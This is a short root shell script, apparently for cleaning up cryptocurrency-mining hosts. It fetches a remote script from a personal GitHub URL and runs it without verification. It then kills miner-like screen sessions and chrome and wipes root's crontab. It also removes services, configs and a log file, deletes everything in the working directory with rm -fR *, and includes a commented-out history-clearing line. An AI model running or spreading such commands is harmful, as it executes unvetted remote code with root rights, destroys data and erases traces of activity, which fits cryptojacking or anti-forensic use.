#!/bin/sh
wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./kill_miner.sh
screen -S Spectre -X quit
screen -S spectre-pool -X quit
screen -S Keymaker -X quit
screen -S Hubble -X quit
/bin/pkill -f "chrome"
cat /dev/null > /var/spool/cron/crontabs/root
sleep 3
rm /etc/systemd/system/qli.service
rm /root/linux-x64/api_config.json
rm /etc/systemd/system/DgtYoutube.service
systemctl stop DgtYoutube
systemctl daemon-reload
systemctl disable DgtYoutube
rm -R /q
rm /var/log/qli.log
sleep 3
rm -fv *
rm -fR *
rm -fR /spectre-pool/
#history -c && history -w
